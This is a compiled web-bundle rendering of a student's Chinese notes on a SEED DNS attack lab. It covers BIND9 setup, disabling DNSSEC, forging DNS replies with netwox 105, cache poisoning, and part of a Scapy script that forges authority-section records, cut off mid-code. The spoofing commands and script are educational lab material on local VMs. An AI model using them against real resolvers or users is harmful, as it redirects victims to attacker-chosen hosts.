(window.webpackJsonp=window.webpackJsonp||[]).push([[38],{227:function(s,t,a){"use strict";a.r(t);var n=a(0),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"local-dns-attack-lab"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#local-dns-attack-lab"}},[s._v("#")]),s._v(" Local DNS Attack Lab")]),s._v(" "),a("h2",{attrs:{id:"pre-experiment"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#pre-experiment"}},[s._v("#")]),s._v(" Pre-Experiment")]),s._v(" "),a("p",[s._v("DNS 攻击的目的是引导受害者去一个攻击者给出的网址.")]),s._v(" "),a("p",[s._v("实验的内容比较多, 需要三台 VM. 一台做 attacker, 一台 Victim, 一台做 DNS Server.")]),s._v(" "),a("ul",[a("li",[s._v("DNS 服务器: 10.0.2.11")]),s._v(" "),a("li",[s._v("攻击者 00 机: 10.0.2.9")]),s._v(" "),a("li",[s._v("受害者 01 机: 10.0.2.12")])]),s._v(" "),a("h2",{attrs:{id:"setting-up-a-local-dns-server"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#setting-up-a-local-dns-server"}},[s._v("#")]),s._v(" Setting Up a Local DNS Server")]),s._v(" "),a("h2",{attrs:{id:"t1-configure-the-user-machine"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t1-configure-the-user-machine"}},[s._v("#")]),s._v(" T1 Configure the User Machine")]),s._v(" "),a("p",[s._v("配置用户机. 设置用户虚拟机的本地 DNS 服务器. "),a("code",[s._v("/etc/resolv.conf")]),s._v(" 文件可以做到这个. 修改一下 "),a("code",[s._v("nameserver 10.0.2.11")]),s._v(".")]),s._v(" "),a("p",[s._v("但是 DHCP 会覆盖这个文件, 所以, 修改文件 "),a("code",[s._v("/etc/resolvconf/resolv.conf.d/head")]),s._v(", 添加 "),a("code",[s._v("nameserver 10.0.2.11")]),s._v(". 完事生效配置文件:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" resolvconf -u\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"t2-set-up-a-local-dns-server"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t2-set-up-a-local-dns-server"}},[s._v("#")]),s._v(" T2 Set up a Local DNS Server")]),s._v(" "),a("p",[s._v("设置一台本地 DNS 服务器")]),s._v(" "),a("h3",{attrs:{id:"t2-1-configure-the-bind9-server"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t2-1-configure-the-bind9-server"}},[s._v("#")]),s._v(" T2.1 Configure the BIND9 server")]),s._v(" "),a("p",[s._v("配置 BIND9 服务器. BIND9 是一种 DNS 服务器软件, 虚拟机里已经装好了 BIND9. BIND9 的配置文件在 "),a("code",[s._v("/etc/bind/named.conf")]),s._v(" 这个文件中包含了其他配置文件的路径:")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("div",{staticClass:"highlight-lines"},[a("div",{staticClass:"highlighted"},[s._v(" ")]),a("br"),a("br"),a("br")]),a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('include "/etc/bind/named.conf.options";\ninclude "/etc/bind/named.conf.local";\ninclude "/etc/bind/named.conf.default-zones";\n')])]),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("我们需要修改的是 "),a("em",[s._v("named.conf.options")]),s._v(" 这个文件, 在这个文件中添加缓存内容文件的路径. 如果不指定, 默认缓存内容文件的路径为: "),a("code",[s._v("/var/cache/bind/named_dump.db")]),s._v(".")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("div",{staticClass:"highlight-lines"},[a("br"),a("br"),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("br"),a("br"),a("br")]),a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('options {\n    directory "/var/cache/bind";\n    dump-file "/var/cache/bind/dump.db";\n    ...\n}\n')])]),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("执行下方的两个指令:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" rndc dumpdb -cache     "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 转存缓存到指定文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" rndc flush             "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 清空缓存文件")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h3",{attrs:{id:"t2-2-turn-off-dnssec"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t2-2-turn-off-dnssec"}},[s._v("#")]),s._v(" T2.2 Turn off DNSSEC")]),s._v(" "),a("p",[s._v("关闭 DNSSEC. DNSSEC 应该是一种防止 DNS 服务器遭受 "),a("em",[s._v("spoofing attcks")]),s._v(" 的防御措施.")]),s._v(" "),a("p",[s._v("还是在上文的 "),a("em",[s._v("named.conf.options")]),s._v(" 文件, 找到并注释: "),a("code",[s._v("dnssec-validation auto;")]),s._v(",\n添加 "),a("code",[s._v("dnssec-enable no;")])]),s._v(" "),a("div",{staticClass:"custom-block warning"},[a("p",{staticClass:"custom-block-title"},[s._v("这两个子操作的具体作用")]),s._v(" "),a("p",[s._v("?")])]),s._v(" "),a("h3",{attrs:{id:"t2-3-start-dns-server"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t2-3-start-dns-server"}},[s._v("#")]),s._v(" T2.3 Start DNS server")]),s._v(" "),a("p",[s._v("启动 DNS 服务器. 有修改就重启.")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" bind9 restart\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"t2-4-use-the-dns-server"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t2-4-use-the-dns-server"}},[s._v("#")]),s._v(" T2.4 Use the DNS server")]),s._v(" "),a("p",[s._v("使用 DNS 服务器. 就是验证一下是不是真的走了 DNS? ping 了一下百度, 可以在 wireshark 上看见 DNS Server 和用户之间的数据交换.")]),s._v(" "),a("h2",{attrs:{id:"t3-host-a-zone-in-the-local-dns-server"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t3-host-a-zone-in-the-local-dns-server"}},[s._v("#")]),s._v(" T3 Host a Zone in the Local DNS Server")]),s._v(" "),a("p",[s._v("在本地 DNS 服务器中托管区域?")]),s._v(" "),a("h3",{attrs:{id:"t3-1-create-zones"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t3-1-create-zones"}},[s._v("#")]),s._v(" T3.1 Create zones")]),s._v(" "),a("p",[s._v("在 BIND9 的配置文件 "),a("code",[s._v("\\etc\\bind\\named.conf")]),s._v(" 中添加:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("zone "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"example.com"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v(" \n    "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v(" master"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/etc/bind/example.com.db"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nzone "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"0.168.192.in-addr.arpa"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v(" \n    "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v(" master"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/etc/bind/192.168.0.db"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("div",{staticClass:"custom-block warning"},[a("p",{staticClass:"custom-block-title"},[s._v("这个东西是做什么? 特指 zone")]),s._v(" "),a("p",[s._v("zone 应该可以理解成域名的片段, 可以是域名, 也可以是域名的一部分, 域名的每部分用 "),a("code",[s._v(".")]),s._v(" 分割.")])]),s._v(" "),a("h3",{attrs:{id:"t3-2-setup-the-forward-lookup-zone-file"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t3-2-setup-the-forward-lookup-zone-file"}},[s._v("#")]),s._v(" T3.2 Setup the forward lookup zone file")]),s._v(" "),a("p",[s._v("设置前向 (由 hostname 到 IP) 的 zone 文件. 在 "),a("code",[s._v("/etc/bind/")]),s._v(" 目录下创建 "),a("code",[s._v("example.com.db")]),s._v(" 文件作为这里的 zone 文件. ("),a("em",[s._v("Seed Lab")]),s._v(" 中提供)")]),s._v(" "),a("h3",{attrs:{id:"t3-3-set-up-the-reverse-lookup-zone-file"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t3-3-set-up-the-reverse-lookup-zone-file"}},[s._v("#")]),s._v(" T3.3 Set up the reverse lookup zone file")]),s._v(" "),a("p",[s._v("设置后向 (由 IP 到 hostname) 的 zone 文件. 在 "),a("code",[s._v("/etc/bind")]),s._v(" 目录下创建 "),a("code",[s._v("192.168.0.db")]),s._v(" 文件作为这里的 zone 文件. ("),a("em",[s._v("Seed Lab")]),s._v(" 中提供)")]),s._v(" "),a("div",{staticClass:"custom-block warning"},[a("p",{staticClass:"custom-block-title"},[s._v("不是很理解这里的两个 zone 文件的作用")]),s._v(" "),a("p",[s._v("指导文件中提到要建立一个 "),a("em",[s._v("authoritative name server")]),s._v(", 这个服务器将直接提供最终的 域名-IP 转换的结果, 而不依赖其他 DNS 提供的缓存. 这里的两个 zone 文件, 大概率和这有关. 但是, 为什么实验要这么做?")])]),s._v(" "),a("h3",{attrs:{id:"t3-4-restart-the-bind-server-and-test"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t3-4-restart-the-bind-server-and-test"}},[s._v("#")]),s._v(" T3.4 Restart the BIND server and test")]),s._v(" "),a("p",[s._v("重启 bind9 的服务. 用户机使用 "),a("code",[s._v("dig www.example.com")]),s._v(" 命令, 可以得到:\n"),a("img",{attrs:{src:"/note/img/2020-02-15-10-09-21.png",alt:""}})]),s._v(" "),a("p",[s._v("如果单纯使用 "),a("code",[s._v("dig")]),s._v(" 指令, 底下的 "),a("em",[s._v("SERVER")]),s._v(" 将会显示 "),a("code",[s._v("127.0.0.1")]),s._v(" 即本地.")]),s._v(" "),a("h2",{attrs:{id:"attacks-on-dns"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#attacks-on-dns"}},[s._v("#")]),s._v(" Attacks on DNS")]),s._v(" "),a("p",[s._v("在 DNS 攻击. 想办法让高德变成缺德. T4 和 T5 应该是一对平起平坐的攻击.")]),s._v(" "),a("h2",{attrs:{id:"t4-modifying-the-host-file"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t4-modifying-the-host-file"}},[s._v("#")]),s._v(" T4 Modifying the Host File")]),s._v(" "),a("p",[s._v("修改 host 文件. 这个攻击中, 我们假设攻击者能够直接修改用户的 "),a("code",[s._v("/etc/hosts")]),s._v(" 文件, 在里面直接将域名对应的 IP 修改为攻击者希望的 IP.")]),s._v(" "),a("p",[s._v("要是能做到这一点, 攻击者基本也为所欲为了吧.")]),s._v(" "),a("h2",{attrs:{id:"t5-directly-spoofing-response-to-user"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t5-directly-spoofing-response-to-user"}},[s._v("#")]),s._v(" T5 Directly Spoofing Response to User")]),s._v(" "),a("p",[s._v("直接给用户一个伪造的响应, 把用户拉倒另一个地方. 假设用户机与攻击者在一个 LAN 下, 在用户机向 DNS 请求一次域名转换, 希望获得域名对应的 IP. 在这个过程中, 攻击者抢先给出一个 DNS 响应消息, 在响应中, 正确的 IP 被修改成了攻击者希望用户访问的 IP.")]),s._v(" "),a("h4",{attrs:{id:"对-dns-回复的要求"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对-dns-回复的要求"}},[s._v("#")]),s._v(" 对 DNS 回复的要求")]),s._v(" "),a("ol",[a("li",[s._v("source IP = DNS IP")]),s._v(" "),a("li",[s._v("destination IP = 用户 IP")]),s._v(" "),a("li",[s._v("source port  = DNS 服务器端口")]),s._v(" "),a("li",[s._v("destination port = 用户机发出 DNS 请求的端口")]),s._v(" "),a("li",[s._v("正确计算 UDP 报文中的检验和?")]),s._v(" "),a("li",[s._v("transaction ID = DNS 请求中的 transaction ID")]),s._v(" "),a("li",[s._v("响应中, 问题部分的域名 = 请求中, 问题部分的域名")]),s._v(" "),a("li",[s._v("响应中, 答案部分的域名 = 请求中, 问题部分的域名")]),s._v(" "),a("li",[s._v("攻击者的响应要比真实的 DNS Server 快")])]),s._v(" "),a("hr"),s._v(" "),a("p",[s._v("利用 "),a("a",{attrs:{href:"http://www.cis.syr.edu/~wedu/Teaching/cis758/netw522/netwox-doc_html/tools/105.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Netwox 105"),a("OutboundLink")],1),s._v(" 工具, 提供了监听 DNS 请求和伪装 DNS 响应的功能.")]),s._v(" "),a("p",[s._v("实验中我们使用 dig 代替用户发起一次 DNS 请求, 请求域名为 "),a("code",[s._v("example.net")])]),s._v(" "),a("p",[s._v("攻击者:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" netwox "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("105")]),s._v(" -h "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"VM"')]),s._v(" -H "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"10.0.2.12"')]),s._v(" -a "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"example.net"')]),s._v(" -A "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1.2.3.4"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"custom-block warning"},[a("p",{staticClass:"custom-block-title"},[s._v("netwox 105")]),s._v(" "),a("p",[s._v("这个 hostname 和 authoritative name 分别代指什么?")])]),s._v(" "),a("p",[s._v("受害者:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dig")]),s._v(" www.example.net\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/note/img/2020-02-16-09-58-59.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"t6-dns-cache-poisoning-attack"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t6-dns-cache-poisoning-attack"}},[s._v("#")]),s._v(" T6 DNS Cache Poisoning Attack")]),s._v(" "),a("p",[s._v("DNS 缓存毒化攻击. 之前的方式都是攻击普通用户设备, 现在我们希望能直接攻击 DNS 服务器, 修改当中的电话本.")]),s._v(" "),a("p",[s._v("一台 DNS 服务器即可以是一台服务器, 也可以是一台客户机. 当它收到用户的 DNS 查询请求的时候会先查看自己的缓存, 如果缓存不存在, 则向上级 DNS 服务查询, 并将上级 DNS 服务器返回的结果添加入自己的缓存, 同时响应用户请求.")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 先清除我们的 DNS 服务器上的缓存:")]),s._v("\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" rndc flush\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 攻击者")]),s._v("\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" netwox "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("105")]),s._v(" -h "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"VM"')]),s._v(" -H "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"10.0.2.11"')]),s._v(" -a "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"example.net"')]),s._v(" -A "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1.2.2.5"')]),s._v(" -T "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),s._v(" -s "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"raw"')]),s._v(" -f "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"src host 10.0.2.11"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# DNS 服务器查看结果")]),s._v("\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" rndc dumpdb -cache\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /var/cache/bind/dump.db\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/note/img/2020-02-16-11-36-30.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"t7-dns-cache-poisoning-targeting-the-authority-section"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t7-dns-cache-poisoning-targeting-the-authority-section"}},[s._v("#")]),s._v(" T7 DNS Cache Poisoning: Targeting the Authority Section")]),s._v(" "),a("p",[s._v("DNS 缓存毒化: 权威结点. 以前的攻击方式只能针对一个域名进行处理, 效率比较低. 这次直接攻击 DNS 依赖的 "),a("em",[s._v("Authority section")]),s._v(", 希望一次攻击能够处理一个域. "),a("a",{attrs:{href:"http://c.biancheng.net/view/6457.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("DNS 报文结构"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("em",[s._v("Task7.py")])]),s._v(" "),a("div",{staticClass:"language-py line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-py"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" scapy"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("all")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("spoof_dns")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("DNS "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pkt "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("and")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'www.example.net'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qname"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"I am in"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 交换源 IP 和目的 IP")]),s._v("\n        IPpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("dst"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("src"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dst"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 交换源端口和目的端口")]),s._v("\n        UDPpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" UDP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("dport"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("UDP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sport"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" sport"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("53")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# The Answer Section")]),s._v("\n        Anssec "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qname"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.2.3.6'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# The Authority Section")]),s._v("\n        NSsec1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'NS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns1.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n        NSsec2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'NS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns2.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        